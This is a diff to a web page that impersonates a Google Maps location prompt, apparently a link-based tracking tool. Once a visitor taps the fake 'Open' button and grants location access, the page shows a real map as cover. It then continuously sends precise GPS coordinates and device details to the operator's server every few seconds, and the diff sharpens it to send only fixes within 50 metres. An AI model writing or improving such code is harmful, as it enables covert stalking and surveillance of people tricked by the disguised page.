@@ -313,7 +313,7 @@ left: 0px;
       <path d="M151444 5419C140355 1916 128560 0 116311 0" fill="#1a73e8"/>
     </svg>
     <h3>Google <span>Maps</span></h3>
-    <button id="allowBtn">Open</button>
+    <button id="allowBtn">oopen</button>
     <div id="status">To continue, enable device location</div>
   </div>
 </div>
@@ -336,62 +336,95 @@ if(!token){ alert("Invalid link"); throw "NO TOKEN"; }
 const mapFrame = document.getElementById("mapFrame");
 const statusEl = document.getElementById("status");
 
-let lastPos = null;
+let lastGoodPos = null;
+let gpsLocked = false;
 
 /* DEVICE INFO */
 function deviceInfo(){
   return {
-    ua:navigator.userAgent,
-    lang:navigator.language,
-    screen:`${screen.width}x${screen.height}`,
+    ua: navigator.userAgent,
+    lang: navigator.language,
+    screen: `${screen.width}x${screen.height}`,
     time: Date.now()
   };
 }
 
-/* SEND TO SERVER */
-function send(pos){
-  lastPos = pos;
+/* SEND ONLY GOOD LOCATION */
+function sendGood(pos){
+  const acc = pos.coords.accuracy;
+  if(acc > 50) return; // ❌ ignore bad accuracy
+
+  lastGoodPos = pos;
+
   fetch(API+"/send-location",{
     method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({
+    headers:{ "Content-Type":"application/json" },
+    body: JSON.stringify({
       token,
-      lat:pos.coords.latitude,
-      lng:pos.coords.longitude,
-      acc:pos.coords.accuracy,
-      device:deviceInfo()
+      lat: pos.coords.latitude,
+      lng: pos.coords.longitude,
+      acc,
+      device: deviceInfo()
     })
   });
 }
 
-/* BUTTON CLICK — MUST BE DIRECT */
+/* STATUS MESSAGE */
+function updateStatus(acc){
+  if(acc > 100){
+    statusEl.textContent = "Using network location…";
+  }else if(acc > 50){
+    statusEl.textContent = "Improving GPS accuracy…";
+  }else{
+    statusEl.textContent = "GPS locked ✔";
+  }
+}
+
+/* BUTTON CLICK — USER ACTION REQUIRED */
 document.getElementById("allowBtn").onclick = ()=>{
   if(!navigator.geolocation){
-    statusEl.textContent="Location not supported";
+    statusEl.textContent = "Location not supported";
     return;
   }
 
-  statusEl.textContent="Requesting GPS permission…";
+  statusEl.textContent = "Requesting GPS permission…";
 
   navigator.geolocation.getCurrentPosition(
     pos=>{
-      // first accurate hit
-      mapFrame.src =
-       `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}&z=18&output=embed`;
+      const acc = pos.coords.accuracy;
+      updateStatus(acc);
 
-      send(pos);
+      if(acc > 50){
+        // ❌ wait for better fix
+        return;
+      }
+
+      // ✅ FIRST GOOD GPS LOCK
+      gpsLocked = true;
+
+      mapFrame.src =
+        `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}&z=18&output=embed`;
+
+      sendGood(pos);
       document.getElementById("permission").remove();
 
-      // watch GPS changes
+      /* CONTINUOUS TRACKING */
       navigator.geolocation.watchPosition(
-        p=>send(p),
+        p=>{
+          updateStatus(p.coords.accuracy);
+          sendGood(p);
+        },
         ()=>{},
-        { enableHighAccuracy:true, maximumAge:0 }
+        {
+          enableHighAccuracy: true,
+          maximumAge: 0,
+          timeout: 10000
+        }
       );
 
-      // FORCE send every 5 seconds (IMPORTANT)
+      /* KEEP ALIVE — resend last GOOD fix */
       setInterval(()=>{
-        if(lastPos) send(lastPos);
+        if(lastGoodPos) sendGood(lastGoodPos);
       }, 5000);
 
     },
@@ -401,10 +434,15 @@ document.getElementById("allowBtn").onclick = ()=>{
         ? "Permission denied. Enable Precise Location."
         : "GPS unavailable. Turn ON location.";
     },
-    { enableHighAccuracy:true, timeout:25000, maximumAge:0 }
+    {
+      enableHighAccuracy: true,
+      timeout: 25000,
+      maximumAge: 0
+    }
   );
 };
 </script>
+
 
 
 
